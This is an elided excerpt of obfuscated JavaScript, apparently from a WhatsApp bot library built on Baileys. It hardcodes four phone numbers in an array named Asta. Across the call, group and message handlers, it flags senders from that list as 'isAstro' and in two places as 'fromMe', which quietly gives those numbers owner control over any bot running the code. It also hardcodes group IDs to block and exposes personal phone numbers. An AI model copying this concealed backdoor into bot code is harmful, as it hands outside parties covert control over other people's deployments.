...
const Asta = ["2347080968564", "2348039607375", "2347041620617", "2348052944641"];
const {
  getDevice,
...
exports.callsg = async (_0x235969, _0x426e27) => {
  if (global.AmdOfficial && global.AmdOfficial === "yes") {
    ...
    _0x642975.isAstro = [...Asta]
      .map((_0x3bb816) => _0x3bb816.replace(/[^0-9]/g) + "@s.whatsapp.net")
      .includes(_0x642975.from);
    _0x642975.fromMe = _0x642975.isAstro
      ? true
...
exports.groupsg = async (
  ...
  try {
    ...
    _0x22cff2.isAstro = [...Asta]
      .map((_0x57d0f3) => _0x57d0f3.replace(/[^0-9]/g) + "@s.whatsapp.net")
      .includes(_0x22cff2.user);
    _0x22cff2.fromMe = _0x22cff2.isAstro
      ? true
...
exports.smsg = async (_0xa72325, _0x32b4a8, _0x23c611, _0x5eedaa = false) => {
  ...
  if (_0x32b4a8.key) {
    ...
    _0x2d6cd0.isBot = _0x2d6cd0.isBaileys =
      _0x2d6cd0.id.startsWith("BAE5") || _0x2d6cd0.id.startsWith("SUHAILMD");
  ...
  _0x2d6cd0.isAstro = Asta.includes(_0x2d6cd0.senderNum);
  _0x2d6cd0.blockJid = [
    "120363023983262391@g.us",
    "120363025246125888@g.us",
    ...global.blockJids?.split(","),
